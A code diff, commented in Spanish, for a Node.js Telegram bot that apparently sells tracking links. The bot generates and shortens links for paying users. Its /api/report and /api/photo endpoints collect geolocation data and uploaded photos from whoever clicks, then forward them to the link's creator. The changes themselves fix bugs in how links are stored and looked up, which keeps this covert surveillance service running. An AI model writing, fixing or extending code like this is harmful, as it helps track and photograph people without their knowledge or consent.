@@ -1133,18 +1133,24 @@ async function handleCommand(msg) {
             await supabase.from('bot_users').update({ credits: user.credits - 3 }).eq('chat_id', userId);
         }
 
-        const target = argsRaw.join(' ').trim() || `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-        await supabase.from('bot_links').insert([{ target_id: target, chat_id: userId }]);
+        // Generar un target único para evitar colisiones
+        const label = argsRaw.join(' ').trim();
+        const randomSuffix = Math.random().toString(36).substring(2, 6).toUpperCase();
+        const target = label ? `${label.substring(0, 15)}_${randomSuffix}` : `V${randomSuffix}`;
+
+        const { error: insError } = await supabase.from('bot_links').insert([{ target_id: target, chat_id: userId }]);
+        if (insError) {
+             console.error("Error inserting link:", insError);
+             await sendMessage(chatId, `❌ Error al guardar el enlace. Intente con otra etiqueta.`);
+             return;
+        }
 
         const longUrl = buildTrackingUrl(target, type);
         const shortUrl = await shortenUrl(longUrl);
 
         linkHistory.push({ id: target, createdAt: new Date().toLocaleString('es-ES'), owner: from, shortUrl });
         
-        // 🧠 GESTIÓN DE MEMORIA: Solo guardamos los últimos 500 en RAM
-        if (linkHistory.length > 500) {
-            linkHistory.shift();
-        }
+        if (linkHistory.length > 500) linkHistory.shift();
 
         await sendMessage(chatId,
             `📁 <b>Enlace de ${typeName} Generado</b>\n\n` +
@@ -1333,8 +1339,18 @@ app.post('/api/report', async (req, res) => {
     let ownerChatId = ADMIN_CHAT_ID;
 
     if (targetId !== 'Visitante Anónimo') {
-        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
-        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
+        const { data: linkData } = await supabase
+            .from('bot_links')
+            .select('chat_id')
+            .eq('target_id', targetId)
+            .order('created_at', { ascending: false })
+            .limit(1);
+        
+        if (linkData && linkData[0] && linkData[0].chat_id) {
+            ownerChatId = linkData[0].chat_id;
+        } else {
+            console.log(`⚠️ Click en link desconocido: ${targetId}. Notificando al Admin.`);
+        }
     }
 
     const g = data.geo || {};
@@ -1364,8 +1380,16 @@ app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
     const targetId = req.body.targetId || 'Desconocido';
     let ownerChatId = ADMIN_CHAT_ID;
     if (targetId !== 'Desconocido') {
-        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
-        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
+        const { data: linkData } = await supabase
+            .from('bot_links')
+            .select('chat_id')
+            .eq('target_id', targetId)
+            .order('created_at', { ascending: false })
+            .limit(1);
+            
+        if (linkData && linkData[0] && linkData[0].chat_id) {
+            ownerChatId = linkData[0].chat_id;
+        }
     }
     if (req.files && req.files.length > 0) {
         for (const file of req.files) {
